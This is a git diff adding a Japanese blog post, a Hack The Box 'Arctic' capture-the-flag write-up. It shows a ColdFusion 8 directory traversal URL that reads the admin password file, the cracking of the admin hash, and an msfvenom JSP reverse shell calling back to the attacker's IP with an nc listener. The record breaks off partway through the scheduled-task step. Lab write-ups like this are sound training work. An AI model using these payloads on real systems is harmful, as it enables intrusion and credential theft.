@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="color-scheme" content="light dark">
+
+    
+
+    <meta name="author" content="cedric-ryo">
+    <meta name="description" content="HTB_Arctic_writeup">
+    <meta name="keywords" content="Security Enginner,English Beginner,CTF/Bug Bounty Beginner">
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB_Arctic_writeup"/>
+<meta name="twitter:description" content="HTB_Arctic_writeup"/>
+
+    <meta property="og:title" content="HTB_Arctic_writeup" />
+<meta property="og:description" content="HTB_Arctic_writeup" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/posts/htb_arctic_writeup/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-07-01T18:07:16+09:00" />
+<meta property="article:modified_time" content="2022-07-01T18:07:16+09:00" />
+
+
+
+    <title>
+  HTB_Arctic_writeup · cedric-ryo.com
+</title>
+
+    
+      <link rel="canonical" href="http://example.org/posts/htb_arctic_writeup/">
+    
+
+    <link rel="preload" href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>
+
+    
+      
+      
+      <link rel="stylesheet" href="/css/coder.min.d9fddbffe6f27e69985dc5fe0471cdb0e57fbf4775714bc3d847accb08f4a1f6.css" integrity="sha256-2f3b/&#43;byfmmYXcX&#43;BHHNsOV/v0d1cUvD2Eesywj0ofY=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+    <link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+    <meta name="generator" content="Hugo 0.98.0" />
+  </head>
+
+  
+  
+  <body class="preload-transitions colorscheme-light">
+    
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      cedric-ryo.com
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/posts/">Blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://example.org/posts/htb_arctic_writeup/">
+              HTB_Arctic_writeup
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa fa-calendar" aria-hidden="true"></i>
+              <time datetime="2022-07-01T18:07:16&#43;09:00">
+                July 1, 2022
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa fa-clock-o" aria-hidden="true"></i>
+              6-minute read
+            </span>
+          </div>
+          
+          
+          
+        </div>
+      </header>
+
+      <div>
+        
+        <h1 id="hack-the-box-arctic-writeup">
+  【Hack The Box】 Arctic Writeup
+  <a class="heading-link" href="#hack-the-box-arctic-writeup">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<h2 id="information">
+  Information
+  <a class="heading-link" href="#information">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<ul>
+<li>OS：Windows</li>
+<li>難易度：Easy</li>
+<li>IPアドレス：10.129.110.112<br>
+<figure class="center"><img src="/images/Arctic1.png" width="800"/><figcaption>
+            <h4>Screenshot</h4>
+        </figcaption>
+</figure>
+</li>
+</ul>
+<h2 id="recon">
+  Recon
+  <a class="heading-link" href="#recon">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<h3 id="autoreconでスキャンをし135ポートと8500ポートが空いていることがわかります">
+  autoreconでスキャンをし、135ポートと8500ポートが空いていることがわかります。
+  <a class="heading-link" href="#autorecon%e3%81%a7%e3%82%b9%e3%82%ad%e3%83%a3%e3%83%b3%e3%82%92%e3%81%97135%e3%83%9d%e3%83%bc%e3%83%88%e3%81%a88500%e3%83%9d%e3%83%bc%e3%83%88%e3%81%8c%e7%a9%ba%e3%81%84%e3%81%a6%e3%81%84%e3%82%8b%e3%81%93%e3%81%a8%e3%81%8c%e3%82%8f%e3%81%8b%e3%82%8a%e3%81%be%e3%81%99">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ autorecon 10.129.110.112
+</span></span><span style="display:flex;"><span>Plugin <span style="color:#e6db74">&#34;RPCDump&#34;</span> in rpcdump.py is not a subclass of either PortScan, ServiceScan, or Report.
+</span></span><span style="display:flex;"><span>Plugin <span style="color:#e6db74">&#34;MiniImpacketShell&#34;</span> in smbclient.py is not a subclass of either PortScan, ServiceScan, or Report.
+</span></span><span style="display:flex;"><span>Plugin <span style="color:#e6db74">&#34;SMBConnection&#34;</span> in smbclient.py is not a subclass of either PortScan, ServiceScan, or Report.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Scanning target 10.129.110.112
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>10.129.110.112/top-100-udp-ports<span style="color:#f92672">]</span> UDP scan requires AutoRecon be run with root privileges.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>10.129.110.112/all-tcp-ports<span style="color:#f92672">]</span> Discovered open port tcp/135 on 10.129.110.112
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>10.129.110.112/all-tcp-ports<span style="color:#f92672">]</span> Discovered open port tcp/8500 on 10.129.110.112
+</span></span></code></pre></div><h3 id="101291101128500にブラウザでアクセスするとディレクトリリスティングが表示されました">
+  10.129/110.112:8500にブラウザでアクセスすると、ディレクトリリスティングが表示されました。
+  <a class="heading-link" href="#101291101128500%e3%81%ab%e3%83%96%e3%83%a9%e3%82%a6%e3%82%b6%e3%81%a7%e3%82%a2%e3%82%af%e3%82%bb%e3%82%b9%e3%81%99%e3%82%8b%e3%81%a8%e3%83%87%e3%82%a3%e3%83%ac%e3%82%af%e3%83%88%e3%83%aa%e3%83%aa%e3%82%b9%e3%83%86%e3%82%a3%e3%83%b3%e3%82%b0%e3%81%8c%e8%a1%a8%e7%a4%ba%e3%81%95%e3%82%8c%e3%81%be%e3%81%97%e3%81%9f">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<figure class="center"><img src="/images/Arctic2.png" width="800"/><figcaption>
+            <h4>Screenshot</h4>
+        </figcaption>
+</figure>
+
+<h3 id="色々辿っていくとadobe-coldfusionの管理ポータルのログイン画面に辿り着きました">
+  色々辿っていくと、Adobe ColdFusionの管理ポータルのログイン画面に辿り着きました。
+  <a class="heading-link" href="#%e8%89%b2%e3%80%85%e8%be%bf%e3%81%a3%e3%81%a6%e3%81%84%e3%81%8f%e3%81%a8adobe-coldfusion%e3%81%ae%e7%ae%a1%e7%90%86%e3%83%9d%e3%83%bc%e3%82%bf%e3%83%ab%e3%81%ae%e3%83%ad%e3%82%b0%e3%82%a4%e3%83%b3%e7%94%bb%e9%9d%a2%e3%81%ab%e8%be%bf%e3%82%8a%e7%9d%80%e3%81%8d%e3%81%be%e3%81%97%e3%81%9f">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<figure class="center"><img src="/images/Arctic3.png" width="800"/><figcaption>
+            <h4>Screenshot</h4>
+        </figcaption>
+</figure>
+
+<h3 id="searchsploitで検索してみるとdirectory-traversalが可能なものがありました">
+  searchsploitで検索してみると、Directory Traversalが可能なものがありました。
+  <a class="heading-link" href="#searchsploit%e3%81%a7%e6%a4%9c%e7%b4%a2%e3%81%97%e3%81%a6%e3%81%bf%e3%82%8b%e3%81%a8directory-traversal%e3%81%8c%e5%8f%af%e8%83%bd%e3%81%aa%e3%82%82%e3%81%ae%e3%81%8c%e3%81%82%e3%82%8a%e3%81%be%e3%81%97%e3%81%9f">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ searchsploit coldfusion <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------ ---------------------------------
+</span></span><span style="display:flex;"><span> Exploit Title                                                                      |  Path
+</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------ ---------------------------------
+</span></span><span style="display:flex;"><span>Adobe ColdFusion - <span style="color:#e6db74">&#39;probe.cfm&#39;</span> Cross-Site Scripting                                 | cfm/webapps/36067.txt
+</span></span><span style="display:flex;"><span>Adobe ColdFusion - Directory Traversal                                              | multiple/remote/14641.py
+</span></span><span style="display:flex;"><span>Adobe ColdFusion - Directory Traversal <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>                                 | multiple/remote/16985.rb
+</span></span><span style="display:flex;"><span>Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code E | windows/remote/43993.py
+</span></span><span style="display:flex;"><span>Adobe ColdFusion <span style="color:#ae81ff">2018</span> - Arbitrary File Upload                                       | multiple/webapps/45979.txt
+</span></span><span style="display:flex;"><span>Adobe ColdFusion <span style="color:#ae81ff">8</span> - Remote Command Execution <span style="color:#f92672">(</span>RCE<span style="color:#f92672">)</span>                                 | cfm/webapps/50057.py
+</span></span><span style="display:flex;"><span>Adobe ColdFusion <span style="color:#ae81ff">9</span> - Administrative Authentication Bypass                           | windows/webapps/27755.txt
+</span></span><span style="display:flex;"><span>Adobe ColdFusion &lt; <span style="color:#ae81ff">11</span> Update <span style="color:#ae81ff">10</span> - XML External Entity Injection                     | multiple/webapps/40346.py
+</span></span><span style="display:flex;"><span>Adobe ColdFusion Server 8.0.1 - <span style="color:#e6db74">&#39;/administrator/enter.cfm&#39;</span> Query String Cross-Site  | cfm/webapps/33170.txt
+</span></span><span style="display:flex;"><span>Adobe ColdFusion Server 8.0.1 - <span style="color:#e6db74">&#39;/wizards/common/_authenticatewizarduser.cfm&#39;</span> Query | cfm/webapps/33167.txt
+</span></span><span style="display:flex;"><span>Adobe ColdFusion Server 8.0.1 - <span style="color:#e6db74">&#39;/wizards/common/_logintowizard.cfm&#39;</span> Query String C | cfm/webapps/33169.txt
+</span></span><span style="display:flex;"><span>Adobe ColdFusion Server 8.0.1 - <span style="color:#e6db74">&#39;administrator/logviewer/searchlog.cfm?startRow&#39;</span> Cr | cfm/webapps/33168.txt
+</span></span><span style="display:flex;"><span>Allaire ColdFusion Server 4.0 - Remote File Display / Deletion / Upload / Execution | multiple/remote/19093.txt
+</span></span><span style="display:flex;"><span>Allaire ColdFusion Server 4.0.1 - <span style="color:#e6db74">&#39;CFCRYPT.EXE&#39;</span> Decrypt Pages                       | windows/local/19220.c
+</span></span><span style="display:flex;"><span>ColdFusion 8.0.1 - Arbitrary File Upload / Execution <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>                   | cfm/webapps/16788.rb
+</span></span><span style="display:flex;"><span>ColdFusion 9-10 - Credential Disclosure                                             | multiple/webapps/25305.py
+</span></span><span style="display:flex;"><span>ColdFusion MX - Missing Template Cross-Site Scripting                               | cfm/remote/21548.txt
+</span></span><span style="display:flex;"><span>ColdFusion Scripts Red_Reservations - Database Disclosure                           | asp/webapps/7440.txt
+</span></span><span style="display:flex;"><span>Macromedia ColdFusion MX 6.0 - Remote Development Service File Disclosure           | multiple/remote/22867.pl
+</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------ ---------------------------------
+</span></span><span style="display:flex;"><span>Shellcodes: No Results
+</span></span></code></pre></div><h3 id="directory-traversalのmultipleremote14641pyを見てみるとディレクトリトラバーサルのコードが記載してあるのでこちらを活用">
+  Directory Traversalのmultiple/remote/14641.pyを見てみるとディレクトリトラバーサルのコードが記載してあるので、こちらを活用。
+  <a class="heading-link" href="#directory-traversal%e3%81%aemultipleremote14641py%e3%82%92%e8%a6%8b%e3%81%a6%e3%81%bf%e3%82%8b%e3%81%a8%e3%83%87%e3%82%a3%e3%83%ac%e3%82%af%e3%83%88%e3%83%aa%e3%83%88%e3%83%a9%e3%83%90%e3%83%bc%e3%82%b5%e3%83%ab%e3%81%ae%e3%82%b3%e3%83%bc%e3%83%89%e3%81%8c%e8%a8%98%e8%bc%89%e3%81%97%e3%81%a6%e3%81%82%e3%82%8b%e3%81%ae%e3%81%a7%e3%81%93%e3%81%a1%e3%82%89%e3%82%92%e6%b4%bb%e7%94%a8">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<pre tabindex="0"><code>http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
+</code></pre><h3 id="パスワードハッシュが表示されました">
+  パスワードハッシュが表示されました。
+  <a class="heading-link" href="#%e3%83%91%e3%82%b9%e3%83%af%e3%83%bc%e3%83%89%e3%83%8f%e3%83%83%e3%82%b7%e3%83%a5%e3%81%8c%e8%a1%a8%e7%a4%ba%e3%81%95%e3%82%8c%e3%81%be%e3%81%97%e3%81%9f">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<pre tabindex="0"><code>2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
+</code></pre><figure class="center"><img src="/images/Arctic4.png" width="800"/><figcaption>
+            <h4>Screenshot</h4>
+        </figcaption>
+</figure>
+
+<h3 id="hash-identifierでハッシュの種類を特定しますおそらくsha-1のようです">
+  hash-identifierでハッシュの種類を特定します。おそらくSHA-1のようです。
+  <a class="heading-link" href="#hash-identifier%e3%81%a7%e3%83%8f%e3%83%83%e3%82%b7%e3%83%a5%e3%81%ae%e7%a8%ae%e9%a1%9e%e3%82%92%e7%89%b9%e5%ae%9a%e3%81%97%e3%81%be%e3%81%99%e3%81%8a%e3%81%9d%e3%82%89%e3%81%8fsha-1%e3%81%ae%e3%82%88%e3%81%86%e3%81%a7%e3%81%99">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>hash-identifier                                                                       
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#########################################################################</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#     __  __                     __           ______    _____           #</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#     \ \  _  \  /&#39;__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#                                                             By Zion3R #</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#                                                    www.Blackploit.com #</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#                                                   Root@Blackploit.com #</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#########################################################################</span>
+</span></span><span style="display:flex;"><span>--------------------------------------------------
+</span></span><span style="display:flex;"><span> HASH: 2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Possible Hashs:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> SHA-1
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> MySQL5 - SHA-1<span style="color:#f92672">(</span>SHA-1<span style="color:#f92672">(</span>$pass<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Least Possible Hashs:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Tiger-160
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Haval-160
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> RipeMD-160
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> SHA-1<span style="color:#f92672">(</span>HMAC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Tiger-160<span style="color:#f92672">(</span>HMAC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> RipeMD-160<span style="color:#f92672">(</span>HMAC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Haval-160<span style="color:#f92672">(</span>HMAC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> SHA-1<span style="color:#f92672">(</span>MaNGOS<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> SHA-1<span style="color:#f92672">(</span>MaNGOS2<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>$pass.$salt<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>$salt.$pass<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>$salt.md5<span style="color:#f92672">(</span>$pass<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>$salt.md5<span style="color:#f92672">(</span>$pass<span style="color:#f92672">)</span>.$salt<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>$salt.sha1<span style="color:#f92672">(</span>$pass<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>$salt.sha1<span style="color:#f92672">(</span>$salt.sha1<span style="color:#f92672">(</span>$pass<span style="color:#f92672">)))</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>$username.$pass<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>$username.$pass.$salt<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>md5<span style="color:#f92672">(</span>$pass<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>md5<span style="color:#f92672">(</span>$pass<span style="color:#f92672">)</span>.$salt<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>md5<span style="color:#f92672">(</span>sha1<span style="color:#f92672">(</span>$pass<span style="color:#f92672">)))</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>sha1<span style="color:#f92672">(</span>$pass<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>sha1<span style="color:#f92672">(</span>$pass<span style="color:#f92672">)</span>.$salt<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>sha1<span style="color:#f92672">(</span>$pass<span style="color:#f92672">)</span>.substr<span style="color:#f92672">(</span>$pass,0,3<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>sha1<span style="color:#f92672">(</span>$salt.$pass<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>sha1<span style="color:#f92672">(</span>sha1<span style="color:#f92672">(</span>$pass<span style="color:#f92672">)))</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> sha1<span style="color:#f92672">(</span>strtolower<span style="color:#f92672">(</span>$username<span style="color:#f92672">)</span>.$pass<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>--------------------------------------------------
+</span></span></code></pre></div><h3 id="john-the-ripperでパスワードを抽出しますhappydayというパスワードですこのパスワードをcloudfusionの管理画面に入力してログインします">
+  John the ripperでパスワードを抽出します。happydayというパスワードです。このパスワードをCloudFusionの管理画面に入力してログインします。
+  <a class="heading-link" href="#john-the-ripper%e3%81%a7%e3%83%91%e3%82%b9%e3%83%af%e3%83%bc%e3%83%89%e3%82%92%e6%8a%bd%e5%87%ba%e3%81%97%e3%81%be%e3%81%99happyday%e3%81%a8%e3%81%84%e3%81%86%e3%83%91%e3%82%b9%e3%83%af%e3%83%bc%e3%83%89%e3%81%a7%e3%81%99%e3%81%93%e3%81%ae%e3%83%91%e3%82%b9%e3%83%af%e3%83%bc%e3%83%89%e3%82%92cloudfusion%e3%81%ae%e7%ae%a1%e7%90%86%e7%94%bb%e9%9d%a2%e3%81%ab%e5%85%a5%e5%8a%9b%e3%81%97%e3%81%a6%e3%83%ad%e3%82%b0%e3%82%a4%e3%83%b3%e3%81%97%e3%81%be%e3%81%99">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ john --format<span style="color:#f92672">=</span>raw-sha1  --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt hash.txt
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>Raw-SHA1 <span style="color:#f92672">[</span>SHA1 256/256 AVX2 8x<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Warning: no OpenMP support <span style="color:#66d9ef">for</span> this hash type, consider --fork<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>happyday         <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1g 0:00:00:00 DONE <span style="color:#f92672">(</span>2022-05-13 08:34<span style="color:#f92672">)</span> 100.0g/s 512000p/s 512000c/s 512000C/s jodie..babygrl
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show --format=Raw-SHA1&#34;</span> options to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed
+</span></span></code></pre></div><h3 id="jspのリバースシェルを作成します">
+  JSPのリバースシェルを作成します。
+  <a class="heading-link" href="#jsp%e3%81%ae%e3%83%aa%e3%83%90%e3%83%bc%e3%82%b9%e3%82%b7%e3%82%a7%e3%83%ab%e3%82%92%e4%bd%9c%e6%88%90%e3%81%97%e3%81%be%e3%81%99">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ msfvenom -p java/jsp_shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.40 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f raw &gt; exploit.jsp
+</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">1497</span> bytes
+</span></span></code></pre></div><h3 id="exploitjspを作成したディレクトリでhttpサーバをサーブします">
+  exploit.jspを作成したディレクトリでHTTPサーバをサーブします。
+  <a class="heading-link" href="#exploitjsp%e3%82%92%e4%bd%9c%e6%88%90%e3%81%97%e3%81%9f%e3%83%87%e3%82%a3%e3%83%ac%e3%82%af%e3%83%88%e3%83%aa%e3%81%a7http%e3%82%b5%e3%83%bc%e3%83%90%e3%82%92%e3%82%b5%e3%83%bc%e3%83%96%e3%81%97%e3%81%be%e3%81%99">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo python -m SimpleHTTPServer <span style="color:#ae81ff">80</span>                                       
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">80</span> ...
+</span></span></code></pre></div><h3 id="ncで待ち受けます">
+  ncで待ち受けます。
+  <a class="heading-link" href="#nc%e3%81%a7%e5%be%85%e3%81%a1%e5%8f%97%e3%81%91%e3%81%be%e3%81%99">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nc -lnvp <span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
+</span></span></code></pre></div><h3 id="リバースシェルを配置するパスを確認しますccoldfusion8wwwrootcfideです">
+  リバースシェルを配置するパスを確認します。C:\ColdFusion8\wwwroot\CFIDEです。
+  <a class="heading-link" href="#%e3%83%aa%e3%83%90%e3%83%bc%e3%82%b9%e3%82%b7%e3%82%a7%e3%83%ab%e3%82%92%e9%85%8d%e7%bd%ae%e3%81%99%e3%82%8b%e3%83%91%e3%82%b9%e3%82%92%e7%a2%ba%e8%aa%8d%e3%81%97%e3%81%be%e3%81%99ccoldfusion8wwwrootcfide%e3%81%a7%e3%81%99">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<figure class="center"><img src="/images/Arctic5.png" width="800"/><figcaption>
+            <h4>Screenshot</h4>
+        </figcaption>
+</figure>
+
+<h3 id="スケジュールタスクの必要事項を記載しsubmitします">
+  スケジュールタスクの必要事項を記載し、submitします。
+  <a class="heading-link" href="#%e3%82%b9%e3%82%b1%e3%82%b8%e3%83%a5%e3%83%bc%e3%83%ab%e3%82%bf%e3%82%b9%e3%82%af%e3%81%ae%e5%bf%85%e8%a6%81%e4%ba%8b%e9%a0%85%e3%82%92%e8%a8%98%e8%bc%89%e3%81%97submit%e3%81%97%e3%81%be%e3%81%99">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<figure class="center"><img src="/images/Arctic6.png" width="800"/><figcaption>
+            <h4>Screenshot</h4>
+        </figcaption>
+</figure>
+
+<h3 id="タスクをスタートさせますactionsの一番左のボタンを押します">
+  タスクをスタートさせます。Actionsの一番左のボタンを押します。
